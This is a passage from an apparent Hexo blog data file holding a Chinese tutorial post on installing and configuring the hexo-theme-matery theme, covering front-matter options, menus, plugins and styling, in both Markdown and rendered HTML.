`toc` 选项 |\n| mathjax    | `false`                     | 是否开启数学公式支持 ，本文章是否开启 `mathjax`，且需要在主题的 `_config.yml` 文件中也需要开启才行 |\n| summary    | 无                          | 文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 |\n| categories | 无                          | 文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类 |\n| tags       | 无                          | 文章标签，一篇文章可以多个标签                              |\n| keywords   | 文章标题                     | 文章关键字，SEO 时需要                              |\n| reprintPolicy | cc_by                    | 文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个 |\n\n> **注意**:\n> 1. 如果 `img` 属性不填写的话，文章特色图会根据文章标题的 `hashcode` 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图**各有特色**。\n> 2. `date` 的值尽量保证每篇文章是唯一的，因为本主题中 `Gitalk` 和 `Gitment` 识别 `id` 是通过 `date` 的值来作为唯一标识的。\n> 3. 如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 `_config.yml` 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：[开源中国在线工具](http://tool.oschina.net/encrypt?type=2)、[chahuo](http://encode.chahuo.com/)、[站长工具](http://tool.chinaz.com/tools/hash.aspx)。\n> 4. 您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则\n\n以下为文章的 `Front-matter` 示例。\n\n### 最简示例\n\n```yaml\n---\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\n---\n```\n\n### 最全示例\n\n```yaml\n---\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\nauthor: 赵奇\nimg: /source/images/xxx.jpg\ntop: true\ncover: true\ncoverImg: /images/1.jpg\npassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\ntoc: false\nmathjax: false\nsummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\ncategories: Markdown\ntags:\n  - Typora\n  - Markdown\n---\n```\n\n## 效果截图\n\n![首页](http://static.blinkfox.com/matery-20181202-1.png)\n\n![首页推荐文章](http://static.blinkfox.com/matery-20181202-2.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-3.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-7.png)\n\n![首页文章列表](http://static.blinkfox.com/matery-20181202-8.png)\n\n## 自定制修改\n\n在本主题的 `_config.yml` 中可以修改部分自定义信息，有以下几个部分：\n\n- 菜单\n- 我的梦想\n- 首页的音乐播放器和视频播放器配置\n- 是否显示推荐文章名称和按钮配置\n- `favicon` 和 `Logo`\n- 个人信息\n- TOC 目录\n- 文章打赏信息\n- 复制文章内容时追加版权信息\n- MathJax\n- 文章字数统计、阅读时长\n- 点击页面的'爱心'效果\n- 我的项目\n- 我的技能\n- 我的相册\n- `Gitalk`、`Gitment`、`Valine` 和 `disqus` 评论配置\n- [不蒜子统计](http://busuanzi.ibruce.info/)和谷歌分析（`Google Analytics`）\n- 默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 `hashcode` 值取余，来选择展示对应的特色图\n\n**我认为个人博客应该都有自己的风格和特色**。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 `_config.yml` 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：\n\n### 修改主题颜色\n\n在主题文件的 `/source/css/matery.css` 文件中，搜索 `.bg-color` 来修改背景颜色：\n\n```css\n/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */\n.bg-color {\n    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);\n}\n\n@-webkit-keyframes rainbow {\n   /* 动态切换背景颜色. */\n}\n\n@keyframes rainbow {\n    /* 动态切换背景颜色. */\n}\n```\n\n### 修改 banner 图和文章特色图\n\n你可以直接在 `/source/medias/banner` 文件夹中更换你喜欢的 `banner` 图片，主题代码中是每天动态切换一张，只需 `7` 张即可。如果你会 `JavaScript` 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，`banner` 切换的代码位置在 `/layout/_partial/bg-cover-content.ejs` 文件的 `<script></script>` 代码中：\n\n```javascript\n$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');\n```\n\n在 `/source/medias/featureimages` 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 `_config.yml` 做同步修改。\n\n","slug":"theme-install","published":1,"updated":"2023-03-10T02:52:35.009Z","_id":"clcy469n20007covge6l3b3v1","comments":1,"layout":"post","photos":[],"link":"","content":"<div align=\"middle\">\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1869507838&auto=1&height=66\"></iframe>\n</div>\n\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href=\"https://hexo.io/zh-cn/\">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p>\n<p>点击 <a href=\"https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master\">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p>\n<p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"配置-主要还是看项目的-config-yml和主题的-config-yml\"><a href=\"#配置-主要还是看项目的-config-yml和主题的-config-yml\" class=\"headerlink\" title=\"配置(主要还是看项目的_config.yml和主题的_config.yml)\"></a>配置(主要还是看项目的_config.yml和主题的_config.yml)</h2><h3 id=\"切换主题\"><a href=\"#切换主题\" class=\"headerlink\" title=\"切换主题\"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p>\n<h4 id=\"config-yml-文件的其它修改建议\"><a href=\"#config-yml-文件的其它修改建议\" class=\"headerlink\" title=\"_config.yml 文件的其它修改建议:\"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul>\n<li>请修改主目录中 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://lqs-1.github.io</code>）。</li>\n<li>建议修改目录中 <code>_config.yml</code> 的两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li>\n<li>如果你是中文用户，则建议修改目录中 <code>_config.yml</code> 的 <code>language</code> 的值为 <code>zh-CN</code>。</li>\n</ul>\n<h3 id=\"新建分类-categories-页\"><a href=\"#新建分类-categories-页\" class=\"headerlink\" title=\"新建分类 categories 页\"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo new page <span class=\"token string\">\"categories\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> categories\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 17:25:30</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"categories\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"categories\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"新建标签-tags-页\"><a href=\"#新建标签-tags-页\" class=\"headerlink\" title=\"新建标签 tags 页\"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo new page <span class=\"token string\">\"tags\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> tags\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 18:23:38</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tags\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tags\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"新建-404-页\"><a href=\"#新建-404-页\" class=\"headerlink\" title=\"新建 404 页\"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">touch</span> <span class=\"token number\">404</span>.md<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> <span class=\"token number\">404</span>\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-30 17:25:30</span>\n<span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"404\"</span>\n<span class=\"token key atrule\">layout</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"404\"</span>\n<span class=\"token key atrule\">description</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Oops～，我崩溃了！找不到你想要的页面 :(\"</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"菜单导航配置\"><a href=\"#菜单导航配置\" class=\"headerlink\" title=\"菜单导航配置\"></a>菜单导航配置</h3><h4 id=\"配置基本菜单导航的名称、路径url和图标icon\"><a href=\"#配置基本菜单导航的名称、路径url和图标icon\" class=\"headerlink\" title=\"配置基本菜单导航的名称、路径url和图标icon.\"></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)<br>2.图标icon 可以在<a href=\"https://fontawesome.com/icons\">Font Awesome</a> 中查找   </p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">Index</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>home\n  <span class=\"token key atrule\">Tags</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /tags\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>tags\n  <span class=\"token key atrule\">Categories</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /categories\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>bookmark\n  <span class=\"token key atrule\">Archives</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /archives\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>archive<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"二级菜单配置方法\"><a href=\"#二级菜单配置方法\" class=\"headerlink\" title=\"二级菜单配置方法\"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p>\n<ol>\n<li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)     </li>\n<li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.      </li>\n<li>注意每个二级菜单模块前要加 <code>-</code>.     </li>\n<li>注意缩进格式  </li>\n</ol>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">Index</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>home\n  <span class=\"token key atrule\">Tags</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /tags\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>tags\n  <span class=\"token key atrule\">Categories</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /categories\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>bookmark\n  <span class=\"token key atrule\">Archives</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /archives\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>archive\n  <span class=\"token key atrule\">About</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /about\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>user<span class=\"token punctuation\">-</span>circle<span class=\"token punctuation\">-</span>o\n  <span class=\"token key atrule\">Friends</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /friends\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>address<span class=\"token punctuation\">-</span>book\n  <span class=\"token key atrule\">Medias</span><span class=\"token punctuation\">:</span>\n    <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>list\n    <span class=\"token key atrule\">children</span><span class=\"token punctuation\">:</span>\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Music\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /music\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>music\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Movies\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /movies\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>film\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Books\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /books\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>book\n      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Galleries\n        <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> /galleries\n        <span class=\"token key atrule\">icon</span><span class=\"token punctuation\">:</span> fas fa<span class=\"token punctuation\">-</span>image<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p>\n<h3 id=\"代码高亮\"><a href=\"#代码高亮\" class=\"headerlink\" title=\"代码高亮\"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p>\n<p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&amp;#123;</code> 和 <code>&amp;#125;</code> 的转义字符。</p>\n<p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">highlight</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">auto_detect</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span>\n  <span class=\"token key atrule\">wrap</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">hljs</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">prismjs</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">preprocess</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href=\"https://prismjs.com/download.html\">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p>本主题中还使用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-generator-search <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">search</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> search.xml\n  <span class=\"token key atrule\">field</span><span class=\"token punctuation\">:</span> post<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"中文链接转拼音（建议安装）\"><a href=\"#中文链接转拼音（建议安装）\" class=\"headerlink\" title=\"中文链接转拼音（建议安装）\"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href=\"https://github.com/viko16/hexo-permalink-pinyin\">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p>\n<p>安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> i hexo-permalink-pinyin <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">permalink_pinyin</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">separator</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-'</span> <span class=\"token comment\"># default: '-'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong>注</strong>：除了此插件外，<a href=\"https://github.com/rozbo/hexo-abbrlink\">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p>\n</blockquote>\n<h3 id=\"文章字数统计插件（建议安装）\"><a href=\"#文章字数统计插件（建议安装）\" class=\"headerlink\" title=\"文章字数统计插件（建议安装）\"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href=\"https://github.com/willin/hexo-wordcount\">hexo-wordcount</a>插件。</p>\n<p>安装命令如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> i <span class=\"token parameter variable\">--save</span> hexo-wordcount<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token key atrule\">postInfo</span><span class=\"token punctuation\">:</span>\n  <span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n  <span class=\"token key atrule\">update</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n  <span class=\"token key atrule\">wordCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 设置文章字数统计为 true.</span>\n  <span class=\"token key atrule\">totalCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 设置站点文章总字数统计为 true.</span>\n  <span class=\"token key atrule\">min2read</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 阅读时长.</span>\n  <span class=\"token key atrule\">readCount</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 阅读次数.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"修改社交链接\"><a href=\"#修改社交链接\" class=\"headerlink\" title=\"修改社交链接\"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置。</p>\n<h3 id=\"添加网易云音乐BGM\"><a href=\"#添加网易云音乐BGM\" class=\"headerlink\" title=\"添加网易云音乐BGM\"></a>添加网易云音乐BGM</h3><p>首先打开网易云网页版，找到想听的歌曲，然后点击生成外链</p>\n<p>复制如下代码：</p>\n<pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\">&lt;div align=\"middle\"<span class=\"token punctuation\">></span>这里粘贴刚刚复制的代码&lt;/div<span class=\"token punctuation\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n<h3 id=\"修改打赏的二维码图片\"><a href=\"#修改打赏的二维码图片\" class=\"headerlink\" title=\"修改打赏的二维码图片\"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p>\n<h2 id=\"文章-Front-matter-介绍\"><a href=\"#文章-Front-matter-介绍\" class=\"headerlink\" title=\"文章 Front-matter 介绍\"></a>文章 Front-matter 介绍</h2><h3 id=\"Front-matter-选项详解\"><a href=\"#Front-matter-选项详解\" class=\"headerlink\" title=\"Front-matter 选项详解\"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p>\n<table>\n<thead>\n<tr>\n<th>配置选项</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>title</td>\n<td><code>Markdown</code> 的文件标题</td>\n<td>文章标题，强烈建议填写此选项</td>\n</tr>\n<tr>\n<td>date</td>\n<td>文件创建时的日期时间</td>\n<td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td>\n</tr>\n<tr>\n<td>author</td>\n<td>根 <code>_config.yml</code> 中的 <code>author</code></td>\n<td>文章作者</td>\n</tr>\n<tr>\n<td>img</td>\n<td><code>featureImages</code> 中的某个值</td>\n<td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td>\n</tr>\n<tr>\n<td>top</td>\n<td><code>true</code></td>\n<td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td>\n</tr>\n<tr>\n<td>cover</td>\n<td><code>false</code></td>\n<td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td>\n</tr>\n<tr>\n<td>coverImg</td>\n<td>无</td>\n<td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>\n</tr>\n<tr>\n<td>password</td>\n<td>无</td>\n<td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td>\n</tr>\n<tr>\n<td>toc</td>\n<td><code>true</code></td>\n<td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td>\n</tr>\n<tr>\n<td>mathjax</td>\n<td><code>false</code></td>\n<td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td>\n</tr>\n<tr>\n<td>summary</td>\n<td>无</td>\n<td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>\n</tr>\n<tr>\n<td>categories</td>\n<td>无</td>\n<td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>\n</tr>\n<tr>\n<td>tags</td>\n<td>无</td>\n<td>文章标签，一篇文章可以多个标签</td>\n</tr>\n<tr>\n<td>keywords</td>\n<td>文章标题</td>\n<td>文章关键字，SEO 时需要</td>\n</tr>\n<tr>\n<td>reprintPolicy</td>\n<td>cc_by</td>\n<td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>注意</strong>:</p>\n<ol>\n<li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li>\n<li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 